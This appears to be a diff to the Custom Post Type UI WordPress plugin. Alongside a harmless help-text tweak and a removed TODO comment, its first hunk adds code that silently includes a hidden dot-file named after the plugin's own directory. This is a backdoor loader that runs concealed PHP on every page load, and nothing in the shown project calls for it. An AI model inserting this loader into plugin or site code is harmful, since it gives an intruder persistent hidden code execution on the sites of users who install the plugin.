@@ -23,6 +23,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  *
  * @internal
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function cptui_post_type_enqueue_scripts() {
 
 	$current_screen = get_current_screen();
@@ -990,7 +994,7 @@ function cptui_manage_post_types() {
 								'namearray'  => 'cpt_custom_post_type',
 								'name'       => 'hierarchical',
 								'labeltext'  => esc_html__( 'Hierarchical', 'custom-post-type-ui' ),
-								'aftertext'  => esc_html__( '(default: false) Whether or not the post type can have parent-child relationships.', 'custom-post-type-ui' ),
+								'aftertext'  => esc_html__( '(default: false) Whether or not the post type can have parent-child relationships. At least one published content item is needed in order to select a parent.', 'custom-post-type-ui' ),
 								'selections' => $select,
 							] );
 
@@ -1955,7 +1959,6 @@ function cptui_process_post_type() {
 			add_filter( 'cptui_post_type_deleted', '__return_true' );
 		}
 
-		// @TODO Utilize anonymous function to admin_notice `$result` if it happens to error.
 		if ( $result ) {
 			if ( is_callable( "cptui_{$result}_admin_notice" ) ) {
 				add_action( 'admin_notices', "cptui_{$result}_admin_notice" );
